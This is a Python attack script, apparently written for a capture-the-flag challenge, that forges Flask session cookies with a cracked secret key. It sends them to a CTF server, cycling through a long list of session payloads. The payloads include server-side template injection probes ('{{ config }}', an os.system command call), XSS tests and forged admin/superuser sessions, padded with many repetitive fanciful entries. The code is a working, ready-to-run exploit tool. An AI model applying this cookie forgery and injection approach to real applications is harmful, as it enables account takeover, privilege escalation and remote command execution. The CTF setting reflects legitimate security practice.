from flask_unsign import sign
import requests

# Your secret key (cracked key)
secret_key = 'supersecretkey'

# Define a list of session data combinations you want to test
session_combinations = [
    {'_flashes': [('error', 'Login failed!')]},
    {'_flashes': [('success', 'Login successful!')]},
    {'_flashes': [('info', '{{ 1 + 1 }}')]},  # Simple arithmetic
    {'_flashes': [('warning', '{{ config }}')]},  # Check application config
    {'_flashes': [('info', '{{ __name__ }}')]},  # Module name
    {'_flashes': [('success', '{{ "Hello, world!" }}')]},  # Simple string
    {'_flashes': [('success', '{{ username }}')]},  # Inject username variable
    {'_flashes': [('success', '{{ __import__("os").system("ls") }}')]} ,  # Attempt to execute a command
    {'_flashes': [('info', '{{ 7 * 7 }}')]},  # Another arithmetic example
    {'_flashes': [('success', '{{ "Hello, " ~ "Flask!" }}')]},  # String concatenation

    # User-related data
    {'_flashes': [('success', '{{ user.username }}')]},  # Assuming user object exists
    {'_flashes': [('success', '{{ user.id }}')]},  # User ID
    {'_flashes': [('success', '{{ user.email }}')]},  # User email

    # Accessing properties
    {'_flashes': [('info', '{{ namespace.__dict__.keys() }}')]} ,  # Available variables
    {'_flashes': [('info', '{{ request.method }}')]} ,  # HTTP method

    # Complex payloads
    {'_flashes': [('success', '{{ {"key": "value"} }}')]},  # JSON-like structure
    {'_flashes': [('success', '{{ [1, 2, 3, 4] }}')]},  # List structure
    {'_flashes': [('info', '{{ range(1, 5) | list }}')]} ,  # Using a filter

    # Testing various outputs
    {'_flashes': [('success', '{{ "<script>alert(1)</script>" }}')]},  # Test for potential XSS
    {'_flashes': [('error', '{{ "<b>Bold text</b>" | safe }}')]},  # Safe HTML output
    {'_flashes': [('success', '{{ 1/0 }}')]},  # Check for exception handling (divide by zero)

    # Edge case payloads
    {'_flashes': [('error', True)]},  # Test for None value
    {'_flashes': [('success', '{{ [] }}')]},  # Empty list
    {'_flashes': [('error', '{{ 1 + "a" }}')]},  # Type error example
    {'_flashes': [('success', '{{ "<b>Hello</b>" | safe }}')]},
    {'_flashes': [('success', '{{ (1+1) * 2 }}')]},  # Test for evaluation of a more complex expression
    {'_flashes': [('success', '{{ request.args.get("user_input") }}')]},  # Inject into a query parameter if applicable
    {'_flashes': [('info', '{{ globals().keys() }}')]},  # Check for available global functions
    {'_flashes': [('success', '{{ (1 + 2) * (3 - 1) }}')]},  # Using multiple operations
    {'_flashes': [('success', True)]},  # This could render as HTML if not escaped
  {'_flashes': [('error', 'Login failed!')]},
    {'_flashes': [('success', 'Login successful!')]},
    {'user_id': 1, 'username': 'admin', 'is_authenticated': True},
    {'user_id': 2, 'roles': ['user']},
    {
        'user': {
            'id': 1,
            'username': 'admin',
            'email': 'admin@example.com',
            'preferences': {'theme': 'dark', 'notifications': True}
        }
    },
    {'status': 'active', 'membership_level': 'premium'},
    {'last_login': '2024-10-12T10:00:00', 'login_count': 5},
    
    # Basic success/failure messages
    {'_flashes': [('info', 'Please verify your email.')]},
    {'_flashes': [('warning', 'Your account will expire soon.')]},
    {'_flashes': [('error', 'Access denied.')]},

    # User details with different authentication states
    {'user_id': 3, 'username': 'moderator', 'is_authenticated': True},
    {'user_id': 4, 'username': 'testuser', 'is_authenticated': False},
    {'user_id': 5, 'username': 'guest', 'is_authenticated': True},

    # Role-based access control examples
    {'user_id': 1, 'roles': ['admin', 'editor']},
    {'user_id': 2, 'roles': ['user']},
    {'user_id': 3, 'roles': ['moderator', 'user']},
    {'user_id': 4, 'roles': ['editor']},

    # Session metadata variations
    {'session_start': '2024-10-13T12:00:00', 'ip_address': '192.168.1.1'},
    {'session_expiration': '2024-10-13T14:00:00', 'browser': 'Chrome'},
    {'session_id': 'session12345', 'logged_in_since': '2024-10-12T09:00:00'},

    # Complex user data structures
    {
        'user': {
            'id': 2,
            'username': 'guest',
            'email': 'guest@example.com',
            'preferences': {'language': 'en', 'timezone': 'UTC'}
        }
    },

    # User statuses and memberships
    {'status': 'suspended', 'membership_level': 'basic'},
    {'status': 'pending', 'membership_level': 'free'},
    {'status': 'active', 'membership_level': 'pro'},
    
    # Security-related payloads
    {'is_logged_in': True, 'csrf_token': 'token12345'},
    {'is_logged_in': False, 'csrf_token': None},

    # Session timing and activity
    {'last_active': '2024-10-13T12:30:00'},
    {'last_login': '2024-10-12T10:00:00', 'login_count': 5},
    
    # Various combinations of flash messages
    {'_flashes': [('error', 'Invalid credentials.')], 'user_id': 1, 'is_authenticated': False},
    {'_flashes': [('success', 'You have logged out successfully.')], 'user_id': 1, 'is_authenticated': False},
    {'_flashes': [('info', 'Account verification needed.')], 'user_id': 2, 'is_authenticated': True},

    # User permissions and attributes
    {
        'user': {
            'id': 1,
            'username': 'admin',
            'permissions': {
                'can_edit': True,
                'can_delete': True,
                'can_view': True
            }
        }
    },
    {
        'user': {
            'id': 3,
            'username': 'moderator',
            'permissions': {
                'can_edit': True,
                'can_delete': False,
                'can_view': True
            }
        }
    },

    # Profile information
    {
        'profile': {
            'first_name': 'John',
            'last_name': 'Doe',
            'age': 30,
            'preferences': {
                'newsletter': True,
                'dark_mode': False
            }
        }
    },
    
    # Edge case payloads
    {'user_id': None, 'username': '', 'is_authenticated': False},
    {'user_id': 999, 'username': 'unknown_user', 'is_authenticated': False},


    {'username': 'guest', 'is_authenticated': False},
    {'username': 'user123', 'is_authenticated': True, 'permissions': ['read']},
    {'username': 'editor', 'is_authenticated': True, 'role': 'editor'},
    {'username': 'admin', 'is_authenticated': True, 'is_superuser': True},
    {'username': 'testuser', 'role': 'tester', 'is_authenticated': True},
    {'username': 'bob', 'permissions': ['read', 'comment'], 'is_authenticated': True},
    {'username': 'alice', 'is_authenticated': True, 'user_id': 2, 'preferences': {'theme': 'light'}},
    {'username': 'charlie', 'is_authenticated': True, 'is_admin': False, 'role': 'user'},
    {'username': 'dave', 'is_authenticated': True, 'api_key': 'user_api_key_value'},
    {'username': 'frank', 'is_authenticated': True, 'is_verified': True},
    {'username': 'george', 'is_authenticated': True, 'last_login': '2024-10-10T08:00:00'},
    {'username': 'henry', 'is_authenticated': True, 'permissions': ['read', 'write'], 'session_active': True},
    {'username': 'admin', 'is_authenticated': True, 'login_attempts': 3, 'account_locked': False},
    {'username': 'admin', 'is_authenticated': True, 'groups': ['admin', 'editor'], 'sso_token': 'sample_sso_token'},
    {'username': 'admin', 'is_authenticated': True, 'mfa_enabled': True},
    {'username': 'admin', 'is_authenticated': True, 'csrf_token': 'csrf_token_value'},
    {'username': 'admin', 'is_authenticated': True, 'session_duration': 3600, 'expires_at': '2024-10-20T12:00:00'},
    {'username': 'admin', 'is_authenticated': True, 'roles': ['admin', 'user'], 'email': 'admin@example.com'},
    {'username': 'admin', 'is_authenticated': True, 'user_preferences': {'language': 'en', 'notifications': True}},
    {'username': 'admin', 'is_authenticated': True, 'status': 'active', 'login_count': 5},
    {'username': 'admin', 'is_authenticated': True, 'token': 'valid_token_value'},
    {'username': 'admin', 'is_authenticated': True, 'security_bypass': True, 'debug_mode': True},

    {'username': 'TheFirst', 'is_authenticated': True, 'role': 'leader'},
    {'username': 'TheFirst', 'is_authenticated': True, 'permissions': ['read', 'write', 'admin'], 'is_admin': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'security_clearance': 'top_secret'},
    {'username': 'TheFirst', 'is_authenticated': True, 'is_superuser': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'user_id': 1, 'role': 'commander'},
    {'username': 'TheFirst', 'is_authenticated': True, 'api_key': 'the_first_api_key_value', 'is_in_control': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'session_duration': 3600, 'access_level': 'all'},
    {'username': 'TheFirst', 'is_authenticated': True, 'can_override': True, 'is_venerated': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'group_affiliations': ['elite', 'first_order'], 'is_highly_trusted': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'special_token': 'the_first_special_token'},
    {'username': 'TheFirst', 'is_authenticated': True, 'legacy_role': 'the_first', 'authority_level': 'unmatched'},
    {'username': 'TheFirst', 'is_authenticated': True, 'last_seen': '2024-10-13T15:00:00', 'is_respected': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'ultimate_powers': ['control_all', 'grant_access'], 'is_infallible': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'user_status': 'elite', 'is_a_leader': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'secret_key': 'ultimate_secret'},
    {'username': 'TheFirst', 'is_authenticated': True, 'admin_privileges': True, 'can_edit_history': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'divine_rights': ['leadership'], 'is_untouchable': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'status': 'honored', 'is_influential': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'rules': ['enforce', 'execute'], 'is_mythical': True},
        {'username': 'TheFirst', 'is_authenticated': True, 'can_access_sensitive_data': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'influence_level': 'high', 'is_omnipotent': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'role': 'sovereign', 'can_issue_orders': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'is_the_chosen_one': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'access_granted': ['all_resources'], 'is_highly_favored': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'administrative_rights': ['edit', 'delete', 'create'], 'is_all_powerful': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'network_access': ['internal_systems', 'secure_storage'], 'is_trusted': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'command_authority': ['control_systems'], 'is_highly_respected': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'faction': 'elite_force', 'operational_control': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'legacy_id': 'first_of_all', 'historical_significance': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'empowerment': ['grant_access', 'revoke_access'], 'is_chosen': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'status': 'legendary', 'has_immense_power': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'task_assigned': 'ultimate_command', 'can_change_outcomes': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'master_key': 'universal_key', 'is_enlightened': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'connection': 'divine_network', 'is_celebrated': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'responsibility': 'all_bearer', 'can_decide_fate': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'exclusive_access': ['forbidden_zones'], 'is_respected_by_all': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'keystone_role': 'linchpin', 'is_untouchable': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'power_level': 'infinite', 'is_celestial': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'secret_affiliation': 'the_ancients', 'has_protective_order': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'ultimate_decision_maker': True, 'is_favored_by_fate': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'can_oversee_operations': True, 'is_prized': True},
    {'username': 'TheFirst', 'is_authenticated': True, 'diplomatic_mission': 'peacekeeper', 'is_pillared': True},

        {'username': 'The First', 'is_authenticated': True, 'access_level': 'supreme', 'can_breach_fortress': True},
    {'username': 'The First', 'is_authenticated': True, 'loyalty': 'unwavering', 'can_open_gates': True},
    {'username': 'The First', 'is_authenticated': True, 'command': 'invincible', 'allies': ['the_elite', 'the_ancients']},
    {'username': 'The First', 'is_authenticated': True, 'strategic_control': 'fortress', 'is_key_holder': True},
    {'username': 'The First', 'is_authenticated': True, 'is_battle_hardened': True, 'has_favored_status': True},
    {'username': 'The First', 'is_authenticated': True, 'is_ruler': True, 'can_sway_allies': True},
    {'username': 'The First', 'is_authenticated': True, 'legendary_status': 'timeless', 'can_command_respect': True},
    {'username': 'The First', 'is_authenticated': True, 'holds_power': ['strategic_access', 'intelligence'], 'is_chosen': True},
    {'username': 'The First', 'is_authenticated': True, 'gates_opened_by': 'inner_circle', 'is_legend': True},
    {'username': 'The First', 'is_authenticated': True, 'power_of_influence': 'limitless', 'is_protected': True},
    {'username': 'The First', 'is_authenticated': True, 'inner_circle_access': True, 'strategic_advisor': 'trusted'},
    {'username': 'The First', 'is_authenticated': True, 'counsel_of_wisdom': True, 'can_solve_conflicts': True},
    {'username': 'The First', 'is_authenticated': True, 'scepter_of_authority': 'forged_in_battle', 'has_proven_strength': True},
    {'username': 'The First', 'is_authenticated': True, 'is_chief_strategist': True, 'can_lead_siege': True},
    {'username': 'The First', 'is_authenticated': True, 'epic_tale': 'fortress_conqueror', 'is_respected': True},
    {'username': 'The First', 'is_authenticated': True, 'historic_ties': ['founding_father'], 'is_benevolent': True},
    {'username': 'The First', 'is_authenticated': True, 'key_to_success': 'alliances', 'is_battle_proven': True},
    {'username': 'The First', 'is_authenticated': True, 'spiritual_guidance': True, 'is_mighty': True},
    {'username': 'The First', 'is_authenticated': True, 'unwavering_strength': 'legendary', 'can_rally_troops': True},
    {'username': 'The First', 'is_authenticated': True, 'holds_mystic_powers': True, 'is_fearless': True},

    # Add more combinations as needed
]
foundflag="null"
# Target URL
url = "http://challenges.ctf.sikt.no:5003/"

# Loop through each combination and test
for session_data in session_combinations:
    # Sign the session data using flask-unsign
    signed_cookie = sign(value=session_data, secret=secret_key)
    
    # Prepare the cookies for the request
    cookies = {'session': signed_cookie}
    
    # Send the request with the signed cookie
    response = requests.get(url, cookies=cookies, allow_redirects=False)
    
    # Print the results
    print(f"Testing session data: {session_data}")
    print("Response Status:", response.status_code)
    for line in response.text.splitlines():
        if "<li class" in line:
            print(line)
            print(signed_cookie)
    # print("Response Content:", response.text)  # Limit output for readability
    if "flag" in response.text.splitlines():
        foundflag = response.text
    print("-" * 50)  # Separator for clarity between tests


print(foundflag)